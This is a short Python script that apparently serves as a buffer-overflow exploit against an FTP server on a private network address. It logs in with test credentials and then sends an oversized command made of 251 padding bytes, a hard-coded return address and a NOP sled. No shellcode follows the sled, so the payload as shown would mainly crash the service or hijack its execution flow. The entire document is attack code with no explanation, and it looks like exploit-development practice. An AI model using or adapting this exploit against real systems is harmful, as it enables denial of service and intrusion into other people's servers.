from socket import *
import struct

host = "192.168.1.39"
port = 21
s = socket(AF_INET,SOCK_STREAM)
s.connect((host,port))
ad = struct.pack("I",0x7559B391)
buf =  'A' * 251

buf += ad
buf += '\x90' * 20



s.send('USER test \r\n')
s.recv(1024)
s.send('PASS test \r\n')
s.recv(1024)
s.send(buf+'\r\n')
